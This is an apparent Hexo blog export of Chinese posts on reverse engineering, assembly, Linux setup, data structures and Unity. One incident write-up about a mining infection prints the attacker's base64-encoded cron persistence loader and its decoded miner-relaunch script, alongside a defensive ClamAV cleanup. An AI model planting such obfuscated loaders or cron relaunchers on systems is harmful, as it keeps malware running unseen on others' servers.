<p>首先来到EP</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181050265.png" /></p>
<p>接下来的内容，我们默认两个原则：1. 除非x64dbg标出注释表明当前函数内部包含了大量系统API，或是通过其他迹象表明我们还在_start函数内部，否则我们会跟进所有call和jmp 2. 如果当前函数不是main,则运行至步出(不然对每个函数的分析都要写这一句话233)</p>
<p>首先遇到<code>call 0x0040270C</code>,步入,发现几个辨识度极高的_start函数会包含的API</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181050686.png" /></p>
<p>遇到<code>call 0x00402524</code>,步入,发现做了一些看不懂的操作,然后函数就退出了(没有看见调用字符串)</p>
<p>遇到<code>call 0x004024F4</code>,发现一个辨识度极高的API<code>HeapCreate</code>,继续</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181050884.png" /></p>
<p>遇到<code>call 0x00402367</code>,发现辨识度极高的API,继续</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181050402.png" /></p>
<p>遇到<code>call 0x00401F0B</code>,发现<code>call eax</code>但实际上并未执行该分支</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181050965.png" /></p>
<p>遇到<code>call 0x00401CB7</code>,发现一个辨识度极高的API,继续</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181050546.png" /></p>
<p>诸如此类,来到call 401000;立即警觉这一辨识度极高的地址</p>
<p>进入后发现messageBoxW,从而找到入口点</p>
]]></content>
      <categories>
        <category>信息安全</category>
        <category>二进制</category>
        <category>逆向</category>
      </categories>
  </entry>
  <entry>
    <title>按值传递与引用传递（Function pass by value vs. pass by reference译文）</title>
    <url>/function-pass-by-value-vs-pass-by-reference/</url>
    <content><![CDATA[<h2 id="背景">背景</h2>
<p>之前写过一篇简单区分了一下指针变量和普通变量的区别</p>
<p>后来发现自己还是太年轻了,在外网上面看见了这篇<a href="https://courses.washington.edu/css342/zander/css332/passby.html">文章(2)</a> 感觉写的非常透彻,翻译一下作为笔记</p>
<p><strong>(未经许可,此翻译禁止以任何形式转载,摘录,二次创作)</strong></p>
<h2 id="阅读本文前置知识">阅读本文前置知识</h2>
<ul>
<li>了解栈帧与简单的汇编,编译原理有助于理解本文</li>
<li>如果不了解的话建议看上面的文章(1)就行了</li>
</ul>
<h2 id="正文">正文</h2>
<p>我们将传入函数的参数称为实参，将接受实参并被实参赋值的参数称为形参，他们统称为参数</p>
<p>当我们向函数传递参数时，不同的调用方式导致的不同结果往往会令人困惑，与其称之为“规定”，不如去确切的了解一下不同调用方式在底层当中的具体细节。</p>
<p>回想一下，当你调用一个函数时，一块栈将被划分为帧，这篇文章讨论的关键是此函数的帧当中保存形参和局部变量的情况</p>
<p>根据定义，按值传递意味着函数将会在栈帧中开辟一段内存空间，用于储存实参的<strong>值</strong>的副本（译注：也就是所谓的<strong>保存现场</strong>），当你需要在函数当中使用这个参数时，你只会用到他的值的副本，而非使用其“原件”。当你只是需要<strong>暂时使用</strong>参数，而非<strong>在全局范围内更改参数的值</strong>时，请使用按值传递。</p>
<p>而至于引用传递，则会在栈帧中开辟一段内存空间，用于储存实参的<strong>地址</strong>的副本，函数内任何对形参的操作会直接作用于实参本身（译注：地址虽然是副本，但是相同的地址指向相同的内存，<strong>实际上是同一个东西</strong>；而对于值的副本，不同的副本占据不同的内存空间，互不影响，<strong>实际上是不相干的东西</strong>），当需要<strong>在全局范围内更改参数的值</strong>传入的参数本身时，请使用引用传递</p>
<p>（后面的例子并非原文例子，而是由译者给出 由于笔者主要接触的是汇编语言,于是舍弃了原文当中的C++例子,采用此汇编例子,看不懂该例子的话可以去看一下原文的例子）</p>
<p>按值传递：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov         dword ptr [i],1h  ；待使用的两个变量</span><br><span class="line">mov         dword ptr [j],2h </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">push        ebp  ;生成栈帧</span><br><span class="line"> mov         ebp,esp  </span><br><span class="line"> sub         esp,0CCh  ;开辟内存空间</span><br><span class="line"> push        ebx  ;保存现场</span><br><span class="line"> push        esi  </span><br><span class="line"> push        edi  </span><br><span class="line"> lea         edi,[ebp-0CCh]  ;安全性填充</span><br><span class="line"> mov         ecx,33h  ;安全性填充</span><br><span class="line"> mov         eax,0CCCCCCCCh  ;安全性填充</span><br><span class="line"> rep stos    dword ptr es:[edi]  ;安全性填充</span><br><span class="line"> call swapThemByVal  ;调用函数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">；swapThemByVal</span><br><span class="line"> mov         eax,dword ptr [num1]  ;复制值的副本到eax</span><br><span class="line"> mov         dword ptr [temp],eax </span><br><span class="line"></span><br><span class="line"> mov         eax,dword ptr [num2]  </span><br><span class="line"> mov         dword ptr [num1],eax  </span><br><span class="line"></span><br><span class="line"> mov         eax,dword ptr [temp]  </span><br><span class="line"> mov         dword ptr [num2],eax ;由于编译优化,并未存入新开辟的内存空间当中,而是直接存入eax</span><br><span class="line"></span><br><span class="line">mov eax ,0; 返回值</span><br><span class="line"> pop         edi  ;恢复现场</span><br><span class="line"> pop         esi  </span><br><span class="line"> pop         ebx  </span><br><span class="line"> add         esp,0CCh  </span><br><span class="line"> cmp         ebp,esp  </span><br><span class="line"> call        __RTC_CheckEsp   ;检查是否堆栈溢出</span><br><span class="line"> mov         esp,ebp  ;销毁变量,释放子栈帧,为返回父栈帧做准备</span><br><span class="line"> pop         ebp  ;恢复父栈帧</span><br><span class="line"> ret  ; 返回</span><br></pre></td></tr></table></figure>
<p>引用传递：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lea         eax,[j]  ;复制地址的副本</span><br><span class="line">push        eax  ;将副本入栈</span><br><span class="line">lea         ecx,[i]  ;同理</span><br><span class="line">push        ecx  </span><br><span class="line">push        ebp ;创建栈帧 </span><br><span class="line"> mov         ebp,esp  </span><br><span class="line"> sub         esp,0CCh  ;填充int3</span><br><span class="line"> push        ebx  </span><br><span class="line"> push        esi  </span><br><span class="line"> push        edi  </span><br><span class="line"> lea         edi,[ebp-0CCh]  </span><br><span class="line"> mov         ecx,33h  </span><br><span class="line"> mov         eax,0CCCCCCCCh  </span><br><span class="line"> rep stos    dword ptr es:[edi]  </span><br><span class="line">call        swapThemByRef </span><br><span class="line"></span><br><span class="line">;swapThemByRef </span><br><span class="line"></span><br><span class="line">mov         eax,dword ptr [num1]  ;复制地址的副本到eax</span><br><span class="line"> mov         ecx,dword ptr [eax]  ;eax当中存储的是地址,间接引用这个地址</span><br><span class="line"> mov         dword ptr [temp],ecx  </span><br><span class="line"></span><br><span class="line"> mov         eax,dword ptr [num1]  </span><br><span class="line"> mov         ecx,dword ptr [num2]  </span><br><span class="line"> mov         edx,dword ptr [ecx]  </span><br><span class="line"> mov         dword ptr [eax],edx  </span><br><span class="line"></span><br><span class="line"> mov         eax,dword ptr [num2]  </span><br><span class="line"> mov         ecx,dword ptr [temp]  </span><br><span class="line"> mov         dword ptr [eax],ecx  </span><br><span class="line"></span><br><span class="line"> mov         eax,0  ;返回值</span><br><span class="line"> pop         edi  </span><br><span class="line"> pop         esi  </span><br><span class="line"> pop         ebx  </span><br><span class="line"> add         esp,0CCh  </span><br><span class="line"> cmp         ebp,esp  </span><br><span class="line"> call        __RTC_CheckEsp (0BA129Eh)  </span><br><span class="line"> mov         esp,ebp  </span><br><span class="line"> pop         ebp  </span><br><span class="line"> ret  </span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>信息安全</category>
        <category>杂谈</category>
        <category>开发</category>
        <category>二进制</category>
        <category>C++</category>
      </categories>
      <tags>
        <tag>cpp</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo博客搬迁小笔记</title>
    <url>/hexo-bo-ke-ban-qian-xiao-bi-ji/</url>
    <content><![CDATA[<p>整体没有遇到太多问题, 记录几个不好搜索到的小技巧 https://i007it.com/2022/05/12/Hexo%E8%87%AA%E5%AE%9A%E4%B9%89%E9%A1%B5%E9%9D%A2%E8%B7%B3%E8%BF%87%E6%B8%B2%E6%9F%93/</p>
<h2 id="tag">tag</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tags:</span><br><span class="line">  - 123</span><br><span class="line">  - 456</span><br></pre></td></tr></table></figure>
<p>or</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tags: [123, 456]</span><br></pre></td></tr></table></figure>
<h2 id="categories">categories</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">categories: 123</span><br><span class="line"></span><br><span class="line">categories: [123, 456]</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- 123</span><br><span class="line">- 456</span><br></pre></td></tr></table></figure>
<p>多标签写法，文章被分类到123、456以及123的自分类789这3个分类下面，官方指定写法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">categories:</span><br><span class="line">   - [123]</span><br><span class="line">   - [456]</span><br><span class="line">   - [123, 789]</span><br></pre></td></tr></table></figure>
<p>hexo博客支持latex需要修改渲染器设置, 跟随该文章修改 https://zhuanlan.zhihu.com/p/381508379</p>
<p>但是不知道为什么, 有一篇空文章被新渲染器报错了, 我博客里面空文章不少的, 唯独那篇报错了, 观察了以下没发现特别之处, 唯一特别的是他是草稿文章, 另外他的标题是中文</p>
<p>记得添加apt install到GitHub action 示例如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">steps:</span><br><span class="line">  - name: Install pandoc</span><br><span class="line">    run: sudo apt-get update &amp;&amp; sudo apt-get install -y pandoc</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>悬而未决</tag>
      </tags>
  </entry>
  <entry>
    <title>HP Chromebook 13 G1 安装配置 KALI 2021 双系统</title>
    <url>/hp-chromebook-13-g1-kali-2021/</url>
    <content><![CDATA[<h2 id="背景">背景</h2>
<p>闲鱼上捡漏几百块买到了这个本子(原价五千多)，而且几乎是99新，打算用来户外渗透测试+出差携带（原本的游戏本太沉了，之前和老婆去杭州参加西湖论剑，加上其他行李总共七八公斤负重，逛街逛的膝盖疼呜呜呜）</p>
<p>所有安装以及配置问题均已解决，特以此文记录</p>
<h2 id="正文">正文</h2>
<p>首先进入开发者模式，然后进shell(而非crosh)打开usb boot和legacy boot</p>
<p><code>sudo crossystem dev_boot_legacy=1 dev_boot_usb=1</code></p>
<p>这里需要注意的一点是，如果在kali系统中，开机状态下直接合上笔记本盖子，再次唤醒系统时，这两项会被置零，需要进入chromeOS再次开启，因此，在不刷BIOS的前提下，不建议使用kali单系统，以免误操作导致再也进不了引导（或者自己心中铭记不能在开机时合上盖子也可）（关机时可以随便合盖子）</p>
<p>这里还需要注意的一点是，chromeBOOK在安装GRUB后（笔者不确定这个是不是主要原因，反正本文当中提到的所有东西都配置完之后便会出现下面的现象），就不能再在BIOS页面引导进入chromeOS，必须只能在开发者模式警告页面下按<code>ctrl+D</code>直接引导；如果在BIOS页面选择引导chromeOS，则会直接卡死</p>
<p>好，回到正题</p>
<p>插入kali安装盘和用于安装系统的TF卡，开机，按<code>ctrl+L</code>进入BIOS，选择引导kali安装盘</p>
<p>进入kali安装页面后选择graphic install</p>
<p>提示<code>cannot find graphic mode 413</code></p>
<p>无法找到图像模式413</p>
<p>选择<code>scan all mode</code>扫描所有可用模式</p>
<p>在出现的列表里面选择<code>graphic mode 470</code>便能正常进入图形化界面（对于其他型号chromeBOOK，笔者不敢确定该使用哪个模式），选择其他选项的话，屏幕上会显示雪花噪点，完全看不清</p>
<p>（至于这个470模式和413模式，笔者目前也不知道其具体含义emmm）</p>
<p>正常进入安装页面后，参考其他教程进行分区并安装即可，</p>
<p>安装完成后reboot</p>
<p>如果要进入kali系统，只需先进入BIOS，选择kali引导，提示进入GRUB，<strong>第一次引导时会假死很长一段时间，千万不要在这时强制关机</strong>，后续进入kali时假死时间会明显缩短</p>
<p>进去后发现分辨率有问题，改一下分辨率即可（屏幕驱动完全正常）</p>
<p>声卡驱动有问题，但是笔者不打算装，除非后续有需求</p>
<p>触控板可以用，但是触控板手势的驱动有问题，用不了（其实也不太影响）</p>
<p>（完）</p>
]]></content>
      <categories>
        <category>信息安全</category>
        <category>杂谈</category>
        <category>开发</category>
        <category>二进制</category>
      </categories>
      <tags>
        <tag>环境配置</tag>
      </tags>
  </entry>
  <entry>
    <title>indirectly CALL with PLT and GOT</title>
    <url>/indirectly-call-with-plt-and-got/</url>
    <content><![CDATA[<h2 id="bkgnd">bkgnd</h2>
<p>FOA,English is not my first language and this is just a note for myself,if you take this post by accident please forgive my mistakes</p>
<h2 id="main">Main</h2>
<p>​</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181057254.png" /></p>
<p>Full procedure picture is uploaded</p>
<p>when statically disassemble ,got[1] and [2] is 0x0000 0000.they will be filled by ldd correctly</p>
<p>BTW,we must notice that got and got.plt is aproximately equal to DATA section,while .plt is aproximately equal to TEXT section</p>
<p>resolve happen iff first call happens</p>
<p>resolve find global func addr by its name stored in .dynstr</p>
]]></content>
      <categories>
        <category>黑历史与垃圾</category>
      </categories>
  </entry>
  <entry>
    <title>Kubuntu zsh下刷新异常  出现白线</title>
    <url>/kubuntu-zsh-white-line/</url>
    <content><![CDATA[<p>新机器陪环境,配zsh之前使用系统自带的shell没有出现任何问题</p>
<p>配置zsh前的显示设置为</p>
<p>1080p 120Hz OpenGL3.1 全场景重画 缩放方法精确 总是保留窗口缩略图 125%缩放</p>
<p>本机默认为</p>
<p>1080p 60Hz OpenGL2.0 自动垂直同步 缩放方法精确 只对显示的窗口保留缩略图 100%缩放</p>
<p>中文搜索没找到解决问题的办法,谷歌英文搜索 KDE zsh white lines</p>
<p>第一个文章找到了解决思路</p>
<p>这个文章的作者是ubuntu自己配了KDE环境,我这边是直接使用Kubuntu系统,细节上有所不同</p>
<p>经过文章提示,禁止了小数缩放比例,改为100%缩放,后恢复正常</p>
<p>记录如上</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>存档</category>
      </categories>
      <tags>
        <tag>环境配置</tag>
      </tags>
  </entry>
  <entry>
    <title>ld-linux-x86-64 Linux矿机病毒</title>
    <url>/ld-linux-x86-64-linux-virus/</url>
    <content><![CDATA[<p>之前的站点被sql注入然后提权了,服务器直接失联,同时还被删库了...</p>
<p>谨以此文记录</p>
<h2 id="事发背景">事发背景</h2>
<p>笔者部署了一个自动健康打卡程序(我只是GitHub的搬运工(doge))突然不打卡了,然后ssh上去看看情况,结果发现ssh上不去了,整个服务器直接失联,人都傻了</p>
<p>直接重装服务器也并非一个明智的选择,因为所有备份数据需要ftp/ssh连上去服务器才可以开展</p>
<p>姑且先尝试在阿里云后台点击服务器关机,结果关都关不了,无奈之下选择强制关机,然后重新开机,成功连接ssh(后续发现数据库文件已损坏)</p>
<p>进去shell之后直接输入<code>top</code>命令</p>
<p>看到了一个可疑进程占用率极高,而且在不断攀升,不一会就变成了90%+</p>
<p>通过搜索进程名(ld-linux-x86-64)发现是个挖矿病毒</p>
<h1 id="病毒细节">病毒细节</h1>
<p>搜了一下发现变种比较多，这里讲一种个人感觉比较有意思的变种,说不定可以用来出一道密码学签到题23333</p>
<p>大致思路为:利用管道符加密，解密病毒脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;something encrypted by base64&quot;  base64 -di  sh</span><br></pre></td></tr></table></figure>
<p>echo的内容即为脚本病毒核心内容经base64加密(当然,也可以换成其他加密方式)后的字符串</p>
<h1 id="杀毒">杀毒</h1>
<p>病毒的变种比较多,网上有的文章是test用户下的文件是病毒的核心文件(test用户是攻击者提权之后创建的),而有的是mysql用户,方法不一,最终笔者找到了一个泛用性较好的方法</p>
<p>在搜索的过程中,笔者首次了解到ClamAV这款Linux端开源杀毒软件，于是尝试使用其进行杀毒</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">#CentOS 8.2</span><br><span class="line">sudo dnf --enablerepo=extras install epel-release</span><br><span class="line">sudo dnf update -y</span><br><span class="line">yum install clamd -y</span><br><span class="line">freshclam</span><br><span class="line">service clamd start</span><br><span class="line">chkconfig clamd on</span><br><span class="line">clamscan -r / --move=/tmp</span><br></pre></td></tr></table></figure>
<p>然后就会开始全盘扫描</p>
<p>上述代码中,最后一行的<code>/</code>是扫描的目录范围，<code>--move</code>选项是移至隔离区</p>
<p>扫描出来3个被感染的文件</p>
<p>删除之后问题仍然存在,说明有个进程会监听并拉起病毒程序,经网上文章提示,查看了一下crontab任务清单</p>
<p><code>crontab -l</code></p>
<p>发现可疑进程,每1分钟执行一次,内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env bash</span><br><span class="line"></span><br><span class="line">echo &#x27;IyEvYmluL3NoCmlmIHRlc3QgLXIgL3NiaW4vaW5pdGN0MTsgdGhlbgpwaWQ9JChjYXQgL3NiaW4v</span><br><span class="line">aW5pdGN0MSkKaWYgJChraWxsIC1DSExEICRwaWQgPi9kZXYvbnVsbCAyPiYxKQp0aGVuCnNsZWVw</span><br><span class="line">IDEKZWxzZQpjZCAvc2JpbgouL21rZTNmcyAmPi9kZXYvbnVsbApleGl0IDAKZmkKZmkK&#x27;  base64 -di  sh</span><br></pre></td></tr></table></figure>
<p>base64解密后内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">if test -r /sbin/initct1; then</span><br><span class="line">pid=$(cat /sbin/initct1)</span><br><span class="line">if $(kill -CHLD $pid &gt;/dev/null 2&gt;&amp;1)</span><br><span class="line">then</span><br><span class="line">sleep 1</span><br><span class="line">else</span><br><span class="line">cd /sbin</span><br><span class="line">./mke3fs &amp;&gt;/dev/null</span><br><span class="line">exit 0</span><br><span class="line">fi</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<p>删除该用户的所有crontab,然后再次全盘扫描即可</p>
<p>但是攻击方究竟是如何注入进来的....</p>
<p>限于目前笔者水平,看不懂Linux网络日志emmmm,只好作罢</p>
]]></content>
      <categories>
        <category>信息安全</category>
        <category>杂谈</category>
        <category>二进制</category>
      </categories>
      <tags>
        <tag>服务器</tag>
        <tag>病毒</tag>
        <tag>挖矿</tag>
      </tags>
  </entry>
  <entry>
    <title>C++ 循环链表解决约瑟夫环 leetcode 剑指Offer 62</title>
    <url>/leetcode-offer-62-c/</url>
    <content><![CDATA[<p>很早之前就看过链表的一些基本思想和实现方法的伪代码，当时的第一感觉是挺简单的，实际写一遍之后出现不少细节上的坑点，这些细节大多不会在网上的文章当中细说，主要是debug笔记</p>
<p>最终正确的源码记录如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">struct node &#123;</span><br><span class="line"></span><br><span class="line">    int data;</span><br><span class="line"></span><br><span class="line">    node *next;</span><br><span class="line"></span><br><span class="line">    node(int d, node *n = NULL) : data(d), next(n) &#123;&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">class Joseph &#123;</span><br><span class="line"></span><br><span class="line">private:</span><br><span class="line"></span><br><span class="line">    node *head;</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line"></span><br><span class="line">    Joseph(int n);</span><br><span class="line"></span><br><span class="line">    ~Joseph();</span><br><span class="line"></span><br><span class="line">    void simulate();</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Joseph::Joseph(int n) &#123;</span><br><span class="line">    if (n) &#123;</span><br><span class="line"></span><br><span class="line">        head = new node(1);</span><br><span class="line">        node *temp = head;</span><br><span class="line">        for (int i = 2; i &lt;= n; ++i) &#123;</span><br><span class="line">            temp-&gt;next = new node(i);</span><br><span class="line">            temp = temp-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        temp-&gt;next = head;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        head = new node(1);</span><br><span class="line">        head-&gt;data = 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Joseph::~Joseph() &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void Joseph::simulate() &#123;</span><br><span class="line">    int counter = 0;</span><br><span class="line">    node *targetNode = head;</span><br><span class="line">    node *temp;</span><br><span class="line">    if (targetNode-&gt;next == targetNode) &#123;</span><br><span class="line">        cout &lt;&lt; targetNode-&gt;data;</span><br><span class="line">        delete targetNode;</span><br><span class="line">        targetNode = NULL;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!targetNode-&gt;data) &#123;</span><br><span class="line">        cout &lt;&lt; &quot;No one!&quot;;</span><br><span class="line">        delete targetNode;</span><br><span class="line">        targetNode = NULL;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    if (targetNode-&gt;next != targetNode) counter = 1;</span><br><span class="line">    while (targetNode-&gt;next != targetNode) &#123;</span><br><span class="line">        targetNode = targetNode-&gt;next;</span><br><span class="line">        temp = targetNode-&gt;next;</span><br><span class="line">        cout &lt;&lt; temp-&gt;data &lt;&lt; &quot; &quot;;</span><br><span class="line">        targetNode-&gt;next = temp-&gt;next;</span><br><span class="line">        targetNode = temp-&gt;next;</span><br><span class="line">        delete temp;</span><br><span class="line">        temp = NULL;</span><br><span class="line">    &#125;</span><br><span class="line">    if (counter) &#123;</span><br><span class="line">        cout &lt;&lt; endl &lt;&lt; targetNode-&gt;data;</span><br><span class="line">        delete targetNode;</span><br><span class="line">        targetNode = NULL;</span><br><span class="line">        return;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        cout &lt;&lt; &quot;No one!&quot;;</span><br><span class="line">        delete temp;</span><br><span class="line">        temp = NULL;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    int n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    Joseph jos(n);</span><br><span class="line">    jos.simulate();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="构造函数">构造函数</h3>
<p>最初我的想法比较傻：输入 人数n，就要new N个节点，也就需要分配N个指针指向这些N个节点，但是问题是N的数量在编译阶段是不确定的，那么我该怎么命名这些指针<code>p1</code>,<code>p2</code>,<code>p3</code>....？毕竟这些指针的变量名需要在代码中预先声明，我甚至一度想要用对象数组或者map</p>
<p>后来才反应过来，我需求的这个所谓的指针，就是各个节点当中的成员变量<code>next</code></p>
<p>因此我只需要先判断参数N是否合法,如果合法,就先给<code>head</code>指针<code>new</code>一个node对象,然后再给<code>head-&gt;next</code>指针<code>new</code>一个node对象for循环一遍,出口条件设置为<code>不大于</code>,退出循环后,再把最后一个node的next指向head</p>
<h3 id="simulate函数">simulate函数</h3>
<p>这个函数我的最初实现方式,需要开辟两份空间，总觉得很傻，经过高人指点改成了现在的样子，现在放上一份我最初的代码，以及当时这么写的理由</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181056791.png" /></p>
<p>假设当前targetNode指向了node(2),接下来的操作是（不分先后）:</p>
<ol type="1">
<li>删除node(3)</li>
<li>node(2)-&gt;next指向node(4)</li>
<li>targetNode指向node(4)</li>
</ol>
<p>这些操作肯定要有个先后顺序，最先可以确定的是<code>删除node(3)</code>是最后一个操作，因为该操作是释放内存，又因为对node(3)的唯一引用方式是<code>node(2)-&gt;next</code>，因此我们需要保证在最后一步时仍能找到node(2)，而不会出现野指针</p>
<p>同时，从代码复用的角度来考虑，引用node(2)的唯一方式是当targetNode指向node(2)时，使用targetNode指针进行引用</p>
<p>这样的话，我们进行<code>targetNode指向node(4)</code>这步操作时必须先用一个<code>temp1</code>指针保存</p>
<p>同时，在delete node(3)之前必须用一个指针保存<code>node(3)-&gt;next</code>否则会出现野指针</p>
<p>综上，需要两个临时变量</p>
<p>这样感觉实在是太傻了，总共才三个元素，居然要两个临时变量</p>
<p>更高效的解决办法有两个：</p>
<ol type="1">
<li>双向链表</li>
<li>文章最开始时那堆代码当中的实现方式</li>
</ol>
<p>该方法通过只定义一个指针temp，获得了两个对象的操作权限：<code>node(3)</code>和<code>node(3)-&gt;next</code></p>
<p>这种思维方式让我大受启发，我开始用这一方式继续写下去</p>
<p>但由于夹杂了<code>node(2)-&gt;next-&gt;next</code>这种写法，出现了0xdd的bug（第二轮simulate时delete时会越界 double free），后续debug时，类似的写法全都改写，改写原则为：对next指针的使用只限于一层的深度，如果要使用两层深度的next，则应当改为使用temp的next指针——这样只会调用一层深度的指针</p>
<p>这样，主体问题就都解决了，后续发现测试数据里面有<code>0</code>,<code>-1</code>等非法值，因此加入了几个if作为检测，每个if检测都是出口分支，所以需要加上<code>return;</code> 此外，还需要在<code>exit();</code>之前delete head节点和/或targetNode节点,同时将其置为<code>NULL</code></p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>校内</category>
        <category>数据结构</category>
      </categories>
  </entry>
  <entry>
    <title>linus的速删链表节点代码</title>
    <url>/linus-de-su-shan-lian-biao-jie-dian-dai-ma/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void RemoveByValue(int value ,LinkNode ** head) &#123;</span><br><span class="line"></span><br><span class="line">for (LinkNode** curr = head;*curr ; )</span><br><span class="line">&#123;</span><br><span class="line">LinkNode* entry = *curr;</span><br><span class="line">if (entry-&gt;m_Value)</span><br><span class="line">&#123;</span><br><span class="line">*curr = entry-&gt;m_Next;  通过改变一级指针间接改变二级指针的指向</span><br><span class="line">free(entry);</span><br><span class="line">&#125;</span><br><span class="line">else curr = &amp;entry-&gt;m_Next;//点睛之笔二级指针的一级指针的地址,链表的next指针也属于一级指针</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>笔记</category>
        <category>校内</category>
        <category>数据结构</category>
      </categories>
  </entry>
  <entry>
    <title>manjaro KDE 配置pwn环境遇到的问题</title>
    <url>/manjaro-kde-pei-zhi-pwn-huan-jing-yu-dao-de-wen-ti/</url>
    <content><![CDATA[<h2 id="konsole无法唤起pwndbg唤起新窗口后无法正确识别shebang">Konsole无法唤起pwndbg/唤起新窗口后无法正确识别shebang</h2>
<p>折腾半天，最终看了一些Konsole的源码，解决方法很简单，不用装任何额外软件</p>
<p>只需要在python脚本中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">context.terminal=[&#x27;konsole&#x27;,&#x27;--separate&#x27;,&#x27;-e&#x27;,&#x27;python&#x27;]</span><br></pre></td></tr></table></figure>
<p>即可解决所有问题</p>
<h2 id="透明代理">透明代理</h2>
<p>https://archlinuxstudio.github.io/ArchLinuxTutorial/#/advanced/transparentProxy</p>
<p>跟着这个配就行</p>
<p>但是笔者环境下kde有个小坑</p>
<p>最终解决发办法是设置yakuake的脚本为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (sh -c &quot;pgrep -x qv2ray&quot; &gt; /dev/null)</span><br><span class="line">then</span><br><span class="line">    /bin/zsh</span><br><span class="line">else</span><br><span class="line">    cgnoproxy Applications/Qv2ray_39a851d832fd26df077eb99ae46b99f7.AppImage</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<p>从而让脚本开机自启动且后台运行</p>
<h2 id="开机启动小键盘">开机启动小键盘</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/sddm.conf</span><br><span class="line"></span><br><span class="line">Numlock=none</span><br><span class="line"># 改成</span><br><span class="line">Numlock=on</span><br></pre></td></tr></table></figure>
<h2 id="vscode无法登录">vscode无法登录</h2>
<p>vscode有一段代码是基于gnome的逻辑</p>
<p>KDE因此无法登录，解决办法为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yay -S qtkeychain gnome-keyring</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>信息安全</category>
        <category>笔记</category>
        <category>存档</category>
        <category>开发</category>
        <category>二进制</category>
        <category>PWN</category>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>环境配置</tag>
      </tags>
  </entry>
  <entry>
    <title>Move Player</title>
    <url>/move-player/</url>
    <content><![CDATA[<h2 id="install-input-system">install input system</h2>
<p>windows-&gt;package manager-&gt;input system-&gt;install</p>
<p>there should be a warning thrown, noticing that a pack will install</p>
<p>choose YES</p>
<h2 id="add-input-system-component">add input system component</h2>
<p>click player</p>
<p>in player's inspector -&gt;add component-&gt;player input-&gt;create action</p>
<p>then select a position,such as /asset/Input Action to restore the action set</p>
<p>after you create it you need to choose the new action set you've just created in player input-&gt; action</p>
<p>now WADS is bound to Vector2(a vector that usually is applied to force function ) changing action function by default</p>
<p>but now the player is still not movable,until you write a C# script</p>
<h2 id="write-your-first-c-script">write your first C# script</h2>
<p>click player,then</p>
<p>in inspector-&gt;add component-&gt;add new script to create new C# script</p>
<p>then go to edit-&gt;preference-&gt;External Tools to choose your favorite editor</p>
<p>to me ,it's Rider editor</p>
<p>open your new script with Rider ,you will see there has been some function:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    void Start()</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    private void Update()</span><br><span class="line">    &#123;</span><br><span class="line">​</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
